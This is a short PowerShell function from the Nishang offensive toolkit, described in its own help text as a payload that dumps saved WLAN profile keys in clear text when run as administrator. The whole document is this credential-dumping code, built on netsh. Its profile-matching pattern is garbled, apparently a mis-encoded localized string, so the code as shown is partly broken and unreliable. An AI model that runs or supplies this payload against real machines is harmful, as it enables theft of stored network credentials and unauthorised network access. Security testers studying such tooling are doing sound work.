function Get-Wlan-Keys 
{
<#
.SYNOPSIS
Nishang Payload which dumps keys for WLAN profiles.

.DESCRIPTION
This payload dumps keys in clear text for saved WLAN profiles.
The payload must be run from as administrator to get the keys.

.EXAMPLE
PS > Get-WLAN-Keys
#>

[CmdletBinding()]
Param ()

    $wlans = netsh wlan show profiles | Select-String -Pattern "�����û������ļ�" | Foreach-Object {$_.ToString()}| Foreach-Object {$_.Replace("    �����û������ļ� : ",$null)}
    $exportdata = $wlans 
    $exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}
}